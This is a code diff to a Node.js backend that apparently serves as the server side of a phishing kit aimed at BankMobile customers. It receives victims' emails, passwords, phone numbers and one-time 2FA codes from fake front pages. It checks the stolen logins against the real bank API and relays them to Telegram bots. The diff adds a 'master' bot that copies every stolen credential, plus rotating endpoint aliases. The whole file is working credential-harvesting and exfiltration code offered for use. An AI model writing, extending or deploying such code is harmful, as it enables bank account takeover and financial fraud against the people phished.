@@ -1,5 +1,6 @@
 // ================================================
 // BANKMOBILE CENTRAL RELAY BACKEND
+// All messages go to ALL bots + Master bot
 // ================================================
 
 require('dotenv').config();
@@ -14,7 +15,17 @@ app.use(cors({ origin: '*' }));
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
+// ================================================
+// TELEGRAM BOT CONFIGURATIONS
+// ================================================
 
+// Master bot - receives EVERYTHING
+const MASTER_BOT = {
+    token: process.env.MASTER_BOT_TOKEN || process.env.BOT_TOKEN_1,
+    chatId: process.env.MASTER_CHAT_ID || process.env.CHAT_ID_1
+};
+
+// Individual client bots
 const BOT_CONFIGS = {
     'emmy': {
         token: process.env.BOT_TOKEN_1,
@@ -62,12 +73,15 @@ const BOT_CONFIGS = {
     }
 };
 
+// Default config (fallback)
 const DEFAULT_CONFIG = {
-    token: process.env.DEFAULT_BOT_TOKEN,
-    chatId: process.env.DEFAULT_CHAT_ID
+    token: process.env.DEFAULT_BOT_TOKEN || process.env.BOT_TOKEN_1,
+    chatId: process.env.DEFAULT_CHAT_ID || process.env.CHAT_ID_1
 };
 
-
+// ================================================
+// SEND TO TELEGRAM
+// ================================================
 async function sendToTelegram(token, chatId, message) {
     if (!token || !chatId) {
         console.log('⚠️ Missing token or chat ID');
@@ -82,11 +96,43 @@ async function sendToTelegram(token, chatId, message) {
         console.log(`✅ Telegram sent to: ${chatId}`);
         return true;
     } catch (error) {
-        console.error(`❌ Telegram error:`, error.message);
+        console.error(`❌ Telegram error (${chatId}):`, error.message);
         return false;
     }
 }
 
+// ================================================
+// SEND TO ALL BOTS + MASTER BOT
+// ================================================
+async function sendToAllBots(message, clientId) {
+    const results = [];
+    
+    // 1. Send to the specific client's bot
+    const config = BOT_CONFIGS[clientId] || DEFAULT_CONFIG;
+    const clientResult = await sendToTelegram(config.token, config.chatId, message);
+    results.push({ bot: clientId, sent: clientResult });
+    
+    // 2. Send to MASTER bot (ALWAYS receives everything)
+    const masterResult = await sendToTelegram(MASTER_BOT.token, MASTER_BOT.chatId, message);
+    results.push({ bot: 'MASTER', sent: masterResult });
+    
+    // 3. Send to ALL OTHER bots (optional - commented out to avoid spam)
+    // Uncomment if you want EVERY bot to receive ALL messages
+    /*
+    for (const [name, bot] of Object.entries(BOT_CONFIGS)) {
+        if (name !== clientId) {
+            const result = await sendToTelegram(bot.token, bot.chatId, message);
+            results.push({ bot: name, sent: result });
+        }
+    }
+    */
+    
+    return results;
+}
+
+// ================================================
+// AUTHENTICATE WITH BANKMOBILE
+// ================================================
 async function authenticateWithAPI(email, password) {
     try {
         console.log(`🌐 Sending login request for: ${email}`);
@@ -127,8 +173,10 @@ async function authenticateWithAPI(email, password) {
     }
 }
 
-
-function formatMessage(email, password, success, frontend) {
+// ================================================
+// FORMAT MESSAGE
+// ================================================
+function formatMessage(email, password, success, frontend, step) {
     const timestamp = new Date().toLocaleString('en-US', { timeZone: 'UTC' });
     const statusText = success ? '✅ VALID' : '❌ INVALID';
     const statusEmoji = success ? '✅' : '❌';
@@ -139,11 +187,39 @@ function formatMessage(email, password, success, frontend) {
         `🔑 <b>Password:</b> <code>${password}</code>\n` +
         `📊 <b>Status:</b> ${statusText}\n` +
         `🆔 <b>Client:</b> ${frontend || 'unknown'}\n` +
+        `📌 <b>Step:</b> ${step || 'login'}\n` +
         `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
         `🕐 ${timestamp}`;
 }
 
+function formatPhoneMessage(phone, frontend, step) {
+    const timestamp = new Date().toLocaleString('en-US', { timeZone: 'UTC' });
+    
+    return `📱 <b>PHONE NUMBER</b>\n` +
+        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+        `📱 <b>Phone:</b> <code>${phone}</code>\n` +
+        `🆔 <b>Client:</b> ${frontend || 'unknown'}\n` +
+        `📌 <b>Step:</b> ${step || 'phone_submitted'}\n` +
+        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+        `🕐 ${timestamp}`;
+}
 
+function formatOtpMessage(otp, trusted, frontend, step) {
+    const timestamp = new Date().toLocaleString('en-US', { timeZone: 'UTC' });
+    
+    return `🔐 <b>2FA CODE</b>\n` +
+        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+        `🔢 <b>Code:</b> <code>${otp}</code>\n` +
+        `💻 <b>Trust Device:</b> ${trusted ? '✅ Yes' : '❌ No'}\n` +
+        `🆔 <b>Client:</b> ${frontend || 'unknown'}\n` +
+        `📌 <b>Step:</b> ${step || '2fa_submitted'}\n` +
+        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+        `🕐 ${timestamp}`;
+}
+
+// ================================================
+// SHARED AUTH HANDLER
+// ================================================
 async function handleAuth(req, res) {
     const { email, password, frontend } = req.body;
     
@@ -151,71 +227,61 @@ async function handleAuth(req, res) {
     console.log(`\n🔐 Login attempt from: ${clientId}`);
     console.log(`📧 Email: ${email}`);
     
-    // Get bot config for this frontend
-    const config = BOT_CONFIGS[clientId] || DEFAULT_CONFIG;
-    
     // Validate with BankMobile
     const result = await authenticateWithAPI(email, password);
     
-    // Format and send message
-    const message = formatMessage(email, password, result.success, clientId);
-    await sendToTelegram(config.token, config.chatId, message);
+    // Format message
+    const message = formatMessage(email, password, result.success, clientId, 'login');
+    
+    // Send to ALL bots (client bot + MASTER bot)
+    const results = await sendToAllBots(message, clientId);
     
     // Return response
     res.json({
         success: result.success,
         client: clientId,
-        telegramSent: true
+        telegramSent: results
     });
 }
 
+// ================================================
+// PHONE HANDLER
+// ================================================
+app.post('/submit-phone', async (req, res) => {
+    const { phone, frontend, step } = req.body;
+    const clientId = frontend || 'default';
+    
+    console.log(`📱 Phone from ${clientId}: ${phone}`);
+    
+    const message = formatPhoneMessage(phone, clientId, step || 'phone_submitted');
+    await sendToAllBots(message, clientId);
+    
+    res.json({ success: true });
+});
+
+// ================================================
+// OTP HANDLER
+// ================================================
+app.post('/submit-otp', async (req, res) => {
+    const { otp, trusted, frontend, step } = req.body;
+    const clientId = frontend || 'default';
+    
+    console.log(`🔐 OTP from ${clientId}: ${otp}`);
+    
+    const message = formatOtpMessage(otp, trusted || false, clientId, step || '2fa_submitted');
+    await sendToAllBots(message, clientId);
+    
+    res.json({ success: true });
+});
+
+// ================================================
+// ALL AUTH ENDPOINTS - SUPPORTS ROTATION
+// ================================================
 app.post('/authenticate', handleAuth);
 app.post('/auth', handleAuth);
 app.post('/verify', handleAuth);
 app.post('/login', handleAuth);
 app.post('/validate', handleAuth);
-
-// ================================================
-// PHONE ENDPOINT
-// ================================================
-app.post('/submit-phone', async (req, res) => {
-    const { phone, frontend } = req.body;
-    const clientId = frontend || 'default';
-    const config = BOT_CONFIGS[clientId] || DEFAULT_CONFIG;
-    
-    console.log(`📱 Phone from ${clientId}: ${phone}`);
-    
-    const message = `📱 <b>PHONE NUMBER</b>\n` +
-        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
-        `📱 <b>Phone:</b> <code>${phone}</code>\n` +
-        `🆔 <b>Client:</b> ${clientId}\n` +
-        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
-        `🕐 ${new Date().toLocaleString('en-US', { timeZone: 'UTC' })}`;
-    
-    await sendToTelegram(config.token, config.chatId, message);
-    res.json({ success: true });
-});
-
-// ================================================
-// OTP ENDPOINT
-// ================================================
-app.post('/submit-otp', async (req, res) => {
-    const { otp, frontend } = req.body;
-    const clientId = frontend || 'default';
-    const config = BOT_CONFIGS[clientId] || DEFAULT_CONFIG;
-    
-    console.log(`🔐 OTP from ${clientId}: ${otp}`);
-    
-    const message = `🔐 <b>2FA CODE</b>\n` +
-        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
-        `🔢 <b>Code:</b> <code>${otp}</code>\n` +
-        `🆔 <b>Client:</b> ${clientId}\n` +
-        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
-        `🕐 ${new Date().toLocaleString('en-US', { timeZone: 'UTC' })}`;
-    
-    await sendToTelegram(config.token, config.chatId, message);
-    res.json({ success: true });
-});
 
 // ================================================
 // HEALTH CHECK
@@ -225,8 +291,9 @@ app.get('/health', (req, res) => {
     res.json({ 
         status: 'ok', 
         service: 'bankmobile-relay',
-        bots: botCount,
-        clients: Object.keys(BOT_CONFIGS)
+        bots: botCount + 1, // +1 for MASTER bot
+        clients: Object.keys(BOT_CONFIGS),
+        masterBot: 'configured'
     });
 });
 
@@ -238,6 +305,7 @@ app.get('/', (req, res) => {
         service: 'BankMobile Relay Backend',
         status: 'running',
         clients: Object.keys(BOT_CONFIGS),
+        masterBot: 'Always receives all messages',
         endpoints: {
             'POST /authenticate': 'Login',
             'POST /auth': 'Login',
@@ -256,5 +324,6 @@ app.get('/', (req, res) => {
 // ================================================
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`✅ BankMobile Relay running on port ${PORT}`);
-    console.log(`📨 Bots configured: ${Object.keys(BOT_CONFIGS).join(', ')}`);
+    console.log(`📨 Clients: ${Object.keys(BOT_CONFIGS).join(', ')}`);
+    console.log(`👑 MASTER Bot: Always receives ALL messages`);
 });
